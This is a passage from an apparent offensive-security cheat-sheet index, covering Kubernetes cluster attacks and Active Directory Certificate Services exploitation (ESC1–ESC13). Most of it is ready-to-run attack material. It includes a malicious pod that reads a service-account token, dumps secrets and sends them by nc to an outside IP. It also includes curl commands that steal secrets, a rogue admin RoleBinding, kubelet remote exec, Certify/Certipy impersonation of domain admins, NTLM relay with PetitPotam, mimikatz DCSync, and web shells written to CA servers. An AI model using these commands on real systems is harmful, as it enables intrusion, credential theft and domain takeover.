volume, Secrets/ConfigMaps are always mounted as read-only tmpfs filesystems. You can quickly find these with <code>grep -F \"tmpfs ro\" /etc/mtab</code>.</p> <p>True Kubernetes Volumes are typically used as shared storage or for persistent storage across restarts. These are typically mounted as ext4 filesystems and can be identified with <code>grep -wF \"ext4\" /etc/mtab</code>.</p>"},{"location":"containers/kubernetes/#privileged-containers","title":"Privileged Containers","text":"<p>Kubernetes supports a wide range of security contexts for container and pod execution. The most important of these is the \"privileged\" security policy which makes the host node's devices available under the container's <code>/dev</code> directory. This means having access to the host's Docker socket file (allowing arbitrary container actions) in addition to the host's root disks (which can be used to escape the container entirely).</p> <p>While there is no official way to check for privileged mode from within a container, checking if <code>/dev/kmsg</code> exists will usually suffice.</p>"},{"location":"containers/kubernetes/#rbac-configuration","title":"RBAC Configuration","text":""},{"location":"containers/kubernetes/#listing-secrets","title":"Listing Secrets","text":"<p>An attacker that gains access to list secrets in the cluster can use the following curl commands to get all secrets in \"kube-system\" namespace.</p> <pre><code>curl -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/kube-system/secrets/\n</code></pre>"},{"location":"containers/kubernetes/#access-any-resource-or-verb","title":"Access Any Resource or Verb","text":"<pre><code>resources:\n- '*'\nverbs:\n- '*'\n</code></pre>"},{"location":"containers/kubernetes/#pod-creation","title":"Pod Creation","text":"<p>Check your right with <code>kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml</code>. Then create a malicious pod.yaml file.</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: alpine\n  namespace: kube-system\nspec:\n  containers:\n    - name: alpine\n      image: alpine\n      command: [\"/bin/sh\"]\n      args:\n        [\n          \"-c\",\n          'apk update &amp;&amp; apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',\n        ]\n  serviceAccountName: bootstrap-signer\n  automountServiceAccountToken: true\n  hostNetwork: true\n</code></pre> <p>Then <code>kubectl apply -f malicious-pod.yaml</code></p>"},{"location":"containers/kubernetes/#privilege-to-use-podsexec","title":"Privilege to Use Pods/Exec","text":"<pre><code>kubectl exec -it &lt;POD NAME&gt; -n &lt;PODS NAMESPACE&gt; \u2013- sh\n</code></pre>"},{"location":"containers/kubernetes/#privilege-to-getpatch-rolebindings","title":"Privilege to Get/Patch Rolebindings","text":"<p>The purpose of this JSON file is to bind the admin \"CluserRole\" to the compromised service account. Create a malicious RoleBinging.json file.</p> <pre><code>{\n    \"apiVersion\": \"rbac.authorization.k8s.io/v1\",\n    \"kind\": \"RoleBinding\",\n    \"metadata\": {\n        \"name\": \"malicious-rolebinding\",\n        \"namespaces\": \"default\"\n    },\n    \"roleRef\": {\n        \"apiGroup\": \"*\",\n        \"kind\": \"ClusterRole\",\n        \"name\": \"admin\"\n    },\n    \"subjects\": [\n        {\n            \"kind\": \"ServiceAccount\",\n            \"name\": \"sa-comp\"\n            \"namespace\": \"default\"\n        }\n    ]\n}\n</code></pre> <pre><code>curl -k -v -X POST -H \"Authorization: Bearer &lt;JWT TOKEN&gt;\" -H \"Content-Type: application/json\" https://&lt;master_ip&gt;:&lt;port&gt;/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-RoleBinging.json\ncurl -k -v -X POST -H \"Authorization: Bearer &lt;COMPROMISED JWT TOKEN&gt;\" -H \"Content-Type: application/json\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/kube-system/secret\n</code></pre>"},{"location":"containers/kubernetes/#impersonating-a-privileged-account","title":"Impersonating a Privileged Account","text":"<pre><code>curl -k -v -XGET -H \"Authorization: Bearer &lt;JWT TOKEN (of the impersonator)&gt;\" -H \"Impersonate-Group: system:masters\" -H \"Impersonate-User: null\" -H \"Accept: application/json\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/kube-system/secrets/\n</code></pre>"},{"location":"containers/kubernetes/#privileged-service-account-token","title":"Privileged Service Account Token","text":"<pre><code>$ cat /run/secrets/kubernetes.io/serviceaccount/token\n$ curl -k -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/default/secrets/\n</code></pre>"},{"location":"containers/kubernetes/#kubernetes-endpoints","title":"Kubernetes Endpoints","text":"<pre><code># List Pods\ncurl -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/default/pods/\n\n# List secrets\ncurl -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/default/secrets/\n\n# List deployments\ncurl -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip:&lt;port&gt;/apis/extensions/v1beta1/namespaces/default/deployments\n\n# List daemonsets\ncurl -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip:&lt;port&gt;/apis/extensions/v1beta1/namespaces/default/daemonsets\n</code></pre>"},{"location":"containers/kubernetes/#cadvisor","title":"cAdvisor","text":"<pre><code>curl -k https://&lt;IP Address&gt;:4194\n</code></pre>"},{"location":"containers/kubernetes/#insecure-api-server","title":"Insecure API server","text":"<pre><code>curl -k https://&lt;IP Address&gt;:8080\n</code></pre>"},{"location":"containers/kubernetes/#secure-api-server","title":"Secure API Server","text":"<pre><code>curl -k https://&lt;IP Address&gt;:(8|6)443/swaggerapi\ncurl -k https://&lt;IP Address&gt;:(8|6)443/healthz\ncurl -k https://&lt;IP Address&gt;:(8|6)443/api/v1\n</code></pre>"},{"location":"containers/kubernetes/#etcd-api","title":"etcd API","text":"<pre><code>curl -k https://&lt;IP address&gt;:2379\ncurl -k https://&lt;IP address&gt;:2379/version\netcdctl --endpoints=http://&lt;MASTER-IP&gt;:2379 get / --prefix --keys-only\n</code></pre>"},{"location":"containers/kubernetes/#kubelet-api","title":"Kubelet API","text":"<pre><code>curl -k https://&lt;IP address&gt;:10250\ncurl -k https://&lt;IP address&gt;:10250/metrics\ncurl -k https://&lt;IP address&gt;:10250/pods\n</code></pre>"},{"location":"containers/kubernetes/#kubelet-read-only","title":"kubelet (Read only)","text":"<pre><code>curl -k https://&lt;IP Address&gt;:10255\nhttp://&lt;external-IP&gt;:10255/pods\n</code></pre>"},{"location":"containers/kubernetes/#exploits","title":"Exploits","text":""},{"location":"containers/kubernetes/#accessible-kubelet-on-10250tcp","title":"Accessible kubelet on 10250/TCP","text":"<p>Requirements:</p> <ul> <li><code>--anonymous-auth</code>: Enables anonymous requests to the Kubelet server</li> </ul> <p>Exploit:</p> <ul> <li>Getting pods: <code>curl -ks https://worker:10250/pods</code></li> <li>Run commands: <code>curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} -d 'input=1' -d 'output=1' -d'tty=1' -d 'command=ls' -d 'command=/'</code></li> </ul>"},{"location":"containers/kubernetes/#obtaining-service-account-token","title":"Obtaining Service Account Token","text":"<p>Token is stored at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code></p> <p>Use the service account token: * on <code>kube-apiserver</code> API: <code>curl -ks -H \"Authorization: Bearer &lt;TOKEN&gt;\" https://master:6443/api/v1/namespaces/{namespace}/secrets</code> * with kubectl: <code>kubectl --insecure-skip-tls-verify=true --server=\"https://master:6443\" --token=\"&lt;TOKEN&gt;\" get secrets --all-namespaces -o json</code></p>"},{"location":"containers/kubernetes/#create-gitrepo-volumes-to-execute-code","title":"Create gitRepo Volumes to Execute Code","text":"<p>Requirements:</p> <ul> <li><code>gitRepo</code> volume type enabled</li> <li><code>create</code> rights on pods</li> </ul> <p>Exploit:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pd\nspec:\n  containers:\n  - image: alpine:latest\n    command: [\"sleep\",\"86400\"]\n    name: test-container\n    volumeMounts:\n    - mountPath: /gitrepo\n      name: gitvolume\n  volumes:\n  - name: gitvolume\n    gitRepo:\n      directory: g/.git\n      repository: https://github.com/raesene/repopodexploit.git\n      revision: main\n</code></pre>"},{"location":"containers/kubernetes/#references","title":"References","text":"<ul> <li>Attacking Kubernetes through Kubelet - Withsecure Labs- 11 January, 2019</li> <li>kubehound - Attack Reference</li> <li>KubeHound: Identifying attack paths in Kubernetes clusters - Datadog - October 2, 2023</li> <li>Fun With GitRepo Volumes - Rory McCune - JULY 10TH, 2024</li> <li>Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019</li> <li>Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019</li> <li>Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019</li> <li>Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon</li> <li>Kubernetes Pod Privilege Escalation</li> </ul>"},{"location":"example/ad-adcs-certificate-services/","title":"Active Directory - Certificate Services","text":"<p>Active Directory Certificate Services (AD CS) is a Microsoft Windows server role that provides a public key infrastructure (PKI). It allows you to create, manage, and distribute digital certificates, which are used to secure communication and transactions across a network.</p>"},{"location":"example/ad-adcs-certificate-services/#adcs-enumeration","title":"ADCS Enumeration","text":"<ul> <li> <p>netexec:      <pre><code>netexec ldap domain.lab -u username -p password -M adcs\n</code></pre></p> </li> <li> <p>ldapsearch:      <pre><code>ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=&lt;user&gt;,OU=Users,DC=domain,DC=local' -w '&lt;password&gt;' -b \"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local\" dNSHostName\n</code></pre></p> </li> <li> <p>certutil:      <pre><code>certutil.exe -config - -ping\ncertutil -dump\n</code></pre></p> </li> </ul>"},{"location":"example/ad-adcs-certificate-services/#certificate-enrollment","title":"Certificate Enrollment","text":"<ul> <li> <p>DNS required (<code>CT_FLAG_SUBJECT_ALT_REQUIRE_DNS</code> or <code>CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS</code>): only principals with their <code>dNSHostName</code> attribute set can enroll.</p> <ul> <li>Active Directory Users cannot enroll in certificate templates requiring <code>dNSHostName</code>.</li> <li>Computers will get their <code>dNSHostName</code> attribute set when you domain-join a computer, but the attribute is null if you simply create a computer object in AD.</li> <li>Computers have validated write to their <code>dNSHostName</code> attribute meaning they can add a DNS name matching their computer name.</li> </ul> </li> <li> <p>Email required (<code>CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL</code> or <code>CT_FLAG_SUBJECT_REQUIRE_EMAIL</code>): only principals with their <code>mail</code> attribute set can enroll unless the template is of schema version 1.</p> <ul> <li>By default, users and computers do not have their <code>mail</code> attribute set, and they cannot modify this attribute themselves.</li> <li>Users might have the <code>mail</code> attribute set, but it is rare for computers.</li> </ul> </li> </ul>"},{"location":"example/ad-adcs-certificate-services/#esc1-misconfigured-certificate-templates","title":"ESC1 - Misconfigured Certificate Templates","text":"<p>Domain Users can enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.</p> <p>Requirements</p> <ul> <li>Template that allows for AD authentication</li> <li>ENROLLEE_SUPPLIES_SUBJECT flag</li> <li>[PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage)</li> </ul> <p>Exploitation</p> <ul> <li> <p>Use Certify.exe to see if there are any vulnerable templates</p> <pre><code>Certify.exe find /vulnerable\nCertify.exe find /vulnerable /currentuser\n# or\nPS&gt; Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'\n# or\ncertipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound\n# or\npython bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=lab,DC=local' --filter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))'\n</code></pre> </li> <li> <p>Use Certify, Certi or Certipy to request a Certificate and add an alternative name (user to impersonate)</p> <pre><code># request certificates for the machine account by executing Certify with the \"/machine\" argument from an elevated command prompt.\nCertify.exe request /ca:dc.domain.local\\domain-DC-CA /template:VulnTemplate /altname:domadmin\ncerti.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN\ncertipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'\n</code></pre> </li> <li> <p>Use OpenSSL and convert the certificate, do not enter a password</p> <pre><code>openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n</code></pre> </li> <li> <p>Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus</p> <pre><code>Rubeus.exe asktgt /user:domadmin /certificate:C:\\Temp\\cert.pfx\n</code></pre> </li> </ul> <p>WARNING: These certificates will still be usable even if the user or computer resets their password!</p> <p>NOTE: Look for EDITF_ATTRIBUTESUBJECTALTNAME2, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, ManageCA flags, and NTLM Relay to AD CS HTTP Endpoints.</p>"},{"location":"example/ad-adcs-certificate-services/#esc2-misconfigured-certificate-templates","title":"ESC2 - Misconfigured Certificate Templates","text":"<p>Requirements</p> <ul> <li>Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)</li> </ul> <p>Exploitation</p> <ul> <li>Find template</li> </ul> <pre><code>PS &gt; Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'\n# or\npython bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=megacorp,DC=local' --filter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))'\n</code></pre> <ul> <li>Request a certificate specifying the <code>/altname</code> as a domain admin like in ESC1.</li> </ul>"},{"location":"example/ad-adcs-certificate-services/#esc3-misconfigured-enrollment-agent-templates","title":"ESC3 - Misconfigured Enrollment Agent Templates","text":"<p>ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users</p> <ul> <li>Request a certificate based on the vulnerable certificate template ESC3.</li> </ul> <pre><code>$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'\n[*] Saved certificate and private key to 'john.pfx'\n</code></pre> <ul> <li>Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user</li> </ul> <pre><code>certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\\administrator' -pfx 'john.pfx'\n</code></pre>"},{"location":"example/ad-adcs-certificate-services/#esc4-access-control-vulnerabilities","title":"ESC4 - Access Control Vulnerabilities","text":"<p>Enabling the <code>mspki-certificate-name-flag</code> flag for a template that allows for domain authentication, allow attackers to \"push a misconfiguration to a template leading to ESC1 vulnerability</p> <ul> <li>Search for <code>WriteProperty</code> with value <code>00000000-0000-0000-0000-000000000000</code> using modifyCertTemplate</li> </ul> <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl\n</code></pre> <ul> <li>Add the <code>ENROLLEE_SUPPLIES_SUBJECT</code> (ESS) flag to perform ESC1</li> </ul> <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag\n\n# Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. \nC:\\&gt;StandIn.exe --adcs --filter WebServer --ess --add\n</code></pre> <ul> <li>Perform ESC1 and then restore the value</li> </ul> <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag\n</code></pre> <p>Using Certipy</p> <pre><code># overwrite the configuration to make it vulnerable to ESC1\ncertipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old\n# request a certificate based on the ESC4 template, just like ESC1.\ncertipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'\n# restore the old configuration\ncertipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json\n</code></pre>"},{"location":"example/ad-adcs-certificate-services/#esc5-vulnerable-pki-object-access-control","title":"ESC5 - Vulnerable PKI Object Access Control","text":"<p>Escalate the privileges from Domain Administrator in the child domain into Enterprise Administrator at the forest root.</p> <p>Requirements:</p> <ul> <li>Add new templates to the \"Certificate\" Templates container</li> <li>\"WRITE\" access to the <code>pKIEnrollmentService</code> object</li> </ul> <p>Exploitation:</p> <ul> <li>Use <code>PsExec</code> to launch <code>mmc</code> as SYSTEM on the child DC: <code>psexec.exe /accepteula -i -s mmc</code></li> <li>Connect to \"Configuration naming context\" &gt; \"Certificate Template\" container</li> <li>Open <code>certsrv.msc</code> as SYSTEM and duplicate an existing template</li> <li>Edit the properties of the template to:<ul> <li>Granting enroll rights to a principal we control in the child domain.</li> <li>Including Client Authentication in the Application Policies.</li> <li>Allowing SANs in certificate requests.</li> <li>Not enabling manager approval or authorized signatures.</li> </ul> </li> <li>Publish the certificate template to the CA<ul> <li>Publish by adding the template to the list in <code>certificateTemplate</code> property of <code>CN=Services</code>&gt;<code>CN=Public Key Services</code>&gt;<code>CN=Enrollment Services</code>&gt;<code>pkiEnrollmentService</code></li> </ul> </li> <li>Finally use the ESC1 vulnerability introduced in the duplicated template to issue a certificate impersonating an Enterprise Administrator.</li> </ul>"},{"location":"example/ad-adcs-certificate-services/#esc6-editf_attributesubjectaltname2","title":"ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2","text":"<p>If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.</p> <p>Exploitation</p> <ul> <li> <p>Use Certify.exe to check for UserSpecifiedSAN flag state which refers to the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag.</p> <pre><code>Certify.exe cas\n</code></pre> </li> <li> <p>Request a certificate for a template and add an altname, even though the default <code>User</code> template doesn't normally allow to specify alternative names</p> <pre><code>.\\Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:User /altname:DomAdmin\n</code></pre> </li> </ul> <p>Mitigation</p> <ul> <li>Remove the flag: <code>certutil.exe -config \"CA01.domain.local\\CA01\" -setreg \"policy\\EditFlags\" -EDITF_ATTRIBUTESUBJECTALTNAME2</code></li> </ul>"},{"location":"example/ad-adcs-certificate-services/#esc7-vulnerable-certificate-authority-access-control","title":"ESC7 - Vulnerable Certificate Authority Access Control","text":"<p>Exploitation</p> <ul> <li> <p>Detect CAs that allow low privileged users the <code>ManageCA</code>  or <code>Manage Certificates</code> permissions</p> <pre><code>Certify.exe find /vulnerable\n</code></pre> </li> <li> <p>Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)</p> <pre><code>Certify.exe setconfig /enablesan /restart\n</code></pre> </li> <li> <p>Request the certificate with the desired SAN.</p> <pre><code>Certify.exe request /template:User /altname:super.adm\n</code></pre> </li> <li> <p>Grant approval if required or disable the approval requirement</p> <pre><code># Grant\nCertify.exe issue /id:[REQUEST ID]\n# Disable\nCertify.exe setconfig /removeapproval /restart\n</code></pre> </li> </ul> <p>Alternative exploitation from ManageCA to RCE on ADCS server:</p> <pre><code># Get the current CDP list. Useful to find remote writable shares:\nCertify.exe writefile /ca:SERVER\\ca-name /readonly\n\n# Write an aspx shell to a local web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:C:\\Windows\\SystemData\\CES\\CA-Name\\shell.aspx /input:C:\\Local\\Path\\shell.aspx\n\n# Write the default asp shell to a local web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:c:\\inetpub\\wwwroot\\shell.asp\n\n# Write a php shell to a remote web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:\\\\remote.server\\share\\shell.php /input:C:\\Local\\path\\shell.php\n</code></pre>"},{"location":"example/ad-adcs-certificate-services/#esc8-web-enrollment-relay","title":"ESC8 - Web Enrollment Relay","text":"<p>An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller\u2019s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.</p> <p>Require SecureAuthCorp/impacket PR #1101</p> <ul> <li>Version 1: NTLM Relay + Rubeus + PetitPotam</li> </ul> <pre><code>impacket&gt; python3 ntlmrelayx.py -t http://&lt;ca-server&gt;/certsrv/certfnsh.asp -smb2support --adcs\nimpacket&gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate\n# For a member server or workstation, the template would be \"Computer\".\n# Other templates: workstation, DomainController, Machine, KerberosAuthentication\n\n# Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam \n# You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN\ngit clone https://github.com/topotam/PetitPotam\npython3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP\npython3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP\npython3 dementor.py &lt;listener&gt; &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -d &lt;domain&gt;\npython3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local\n\n# Use the certificate with rubeus to request a TGT\nRubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt\nRubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt\n\n# Now you can use the TGT to perform a DCSync\nmimikatz&gt; lsadump::dcsync /user:krbtgt\n</code></pre> <ul> <li>Version 2: NTLM Relay + Mimikatz + Kekeo</li> </ul> <pre><code>impacket&gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n\n# Mimikatz\nmimikatz&gt; misc::efs /server:dc.lab.local /connect:&lt;IP&gt; /noauth\n\n# Kekeo\nkekeo&gt; base64 /input:on\nkekeo&gt; tgt::ask /pfx:&lt;BASE64-CERT-FROM-NTLMRELAY&gt; /user:dc$ /domain:lab.local /ptt\n\n# Mimikatz\nmimikatz&gt; lsadump::dcsync /user:krbtgt\n</code></pre> <ul> <li>Version 3: Kerberos Relay</li> </ul> <pre><code># Setup the relay\nsudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine\n\n# Run mitm6\nsudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v\n</code></pre> <ul> <li>Version 4: ADCSPwn - Require <code>WebClient</code> service running on the domain controller. By default this service is not installed.</li> </ul> <pre><code>https://github.com/bats3c/ADCSPwn\nadcspwn.exe --adcs &lt;cs server&gt; --port [local port] --remote [computer]\nadcspwn.exe --adcs cs.pwnlab.local\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\\Temp\\cert_b64.txt\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\\mranderson --password The0nly0ne! --dc dc.pwnlab.local\n\n# ADCSPwn arguments\nadcs            -       This is the address of the AD CS server which authentication will be relayed to.\nsecure          -       Use HTTPS with the certificate service.\nport            -       The port ADCSPwn will listen on.\nremote          -       Remote machine to trigger authentication from.\nusername        -       Username for non-domain context.\npassword        -       Password for non-domain context.\ndc              -       Domain controller to query for Certificate Templates (LDAP).\nunc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .\noutput          -       Output path to store base64 generated crt.\n</code></pre> <ul> <li>Version 5: Certipy ESC8</li> </ul> <pre><code>certipy relay -ca 172.16.19.100\n</code></pre>"},{"location":"example/ad-adcs-certificate-services/#esc9-no-security-extension","title":"ESC9 - No Security Extension","text":"<p>Requirements</p> <ul> <li><code>StrongCertificateBindingEnforcement</code> set to <code>1</code> (default) or <code>0</code></li> <li>Certificate contains the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag in the <code>msPKI-Enrollment-Flag</code> value</li> <li>Certificate specifies <code>Any Client</code> authentication EKU</li> <li><code>GenericWrite</code> over any account A to compromise any account B</li> </ul> <p>Scenario</p> <p>John@corp.local has GenericWrite over Jane@corp.local, and we want to compromise Administrator@corp.local. Jane@corp.local is allowed to enroll in the certificate template ESC9 that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value.</p> <ul> <li> <p>Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)</p> <pre><code>certipy shadow auto -username John@corp.local -p Passw0rd -account Jane\n</code></pre> </li> <li> <p>Change the userPrincipalName of Jane to be Administrator.  leave the <code>@corp.local</code> part</p> <pre><code>certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator\n</code></pre> </li> <li> <p>Request the vulnerable certificate template ESC9 from Jane's account.</p> <pre><code>certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9\n# userPrincipalName in the certificate is Administrator \n# the issued certificate contains no \"object SID\"\n</code></pre> </li> <li> <p>Restore userPrincipalName of Jane to Jane@corp.local.</p> <pre><code>certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local\n</code></pre> </li> <li> <p>Authenticate with the certificate and receive the NT hash of the Administrator@corp.local user.</p> <pre><code>certipy auth -pfx administrator.pfx -domain corp.local\n# Add -domain &lt;domain&gt; to your command line since there is no domain specified in the certificate.\n</code></pre> </li> </ul>"},{"location":"example/ad-adcs-certificate-services/#esc11-relaying-ntlm-to-icpr","title":"ESC11 - Relaying NTLM to ICPR","text":"<p>Encryption is not enforced for ICPR requests and Request Disposition is set to Issue.</p> <p>Requirements:</p> <ul> <li>sploutchy/Certipy - Certipy fork</li> <li>sploutchy/impacket - Impacket fork</li> </ul> <p>Exploitation:</p> <ol> <li>Look for <code>Enforce Encryption for Requests: Disabled</code> in <code>certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout</code> output</li> <li> <p>Setup a relay using Impacket ntlmrelay and trigger a connection to it.</p> <pre><code>ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support\n</code></pre> </li> </ol>"},{"location":"example/ad-adcs-certificate-services/#esc12-adcs-ca-on-yubihsm","title":"ESC12 - ADCS CA on YubiHSM","text":"<p>The ESC12 vulnerability occurs when a Certificate Authority (CA) stores its private key on a YubiHSM2 device, which requires an authentication key (password) to access. This password is stored in the registry in cleartext, allowing an attacker with shell access to the CA server to recover the private key.</p> <p>Unlocking the YubiHSM with the plaintext password in the registry key: <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Yubico\\YubiHSM\\AuthKeysetPassword</code>.</p> <ul> <li>Importing the CA certificate into the user store</li> </ul> <pre><code>certutil -addstore -user my &lt;CA certificate file&gt;\n</code></pre> <ul> <li>Associated with the private key in the YubiHSM2 device</li> </ul> <pre><code>certutil -csp \"YubiHSM Key Storage Provider\" -repairstore -user my &lt;CA Common Name&gt;\n</code></pre> <ul> <li>Finally use <code>certutil -sign ...</code></li> </ul>"},{"location":"example/ad-adcs-certificate-services/#esc13-issuance-policy","title":"ESC13 - Issuance Policy","text":"<p>If a principal (user or computer) has enrollment rights on a certificate template configured with an issuance policy that has an OID group link, then this principal can enroll a certificate that allows obtaining access to the environment as a member of the group specified in the OID group link.</p> <p>Requirements</p> <ul> <li>The principal has enrollment rights on a certificate template</li> <li>The certificate template has an issuance policy extension</li> <li>The issuance policy has an OID group link to a group</li> <li>The certificate template defines EKUs that enable client authentication</li> </ul> <pre><code>PS C:\\&gt; $ESC13Template = Get-ADObject \"CN=ESC13Template,$TemplateContainer\" -Properties nTSecurityDescriptor $ESC13Template.nTSecurityDescriptor.Access | ? 